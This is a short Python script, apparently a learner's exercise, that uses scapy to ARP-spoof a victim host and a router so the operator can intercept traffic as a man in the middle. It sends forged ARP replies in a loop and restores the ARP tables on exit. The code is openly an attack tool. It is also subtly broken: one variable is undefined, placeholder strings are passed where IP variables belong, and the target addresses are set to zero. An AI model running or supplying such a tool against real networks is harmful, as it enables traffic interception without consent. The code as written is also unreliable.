#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    """
        sscapy.ARP()  will put my mac address as the source mac address by default 
        op field is 1 by default wich means arp request, 2 is a response 
        before use need to able packet forwarding in kali
        to dp so :
                echo 1 > /proc/sys/net/ipv4/ip_forward
    """
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 
    scapy.send(packet)    


def restore(destination_ip, source_ip):
    """
        Restore the correct ARP table 
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

targetIP = 0 
routerIP = 0 # routerIP = gateway_ip
#only on python2.7 or below 
try:
    sent_packets_count = 0 
    while True:
        spoof("victimIP","routerIP") #tell victim i am router
        spoof("routerIP","victimIP") #tell router i am the victim so i can act as a man in the middle
        sent_packets_count+=2
        print("\r[+] Packets sent: {}".format(sent_packets_count)), #tells python to print without a new line, putthing every print statement in a buffer that
        # \r tells python to always print at the start of the line 
        sys.stdout.flush() 
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected ctrl+c ..... Quiting.")
    restore(targetIP, routerIP)
    restore(routerIP, targetIP)
    print("Exit successful\n")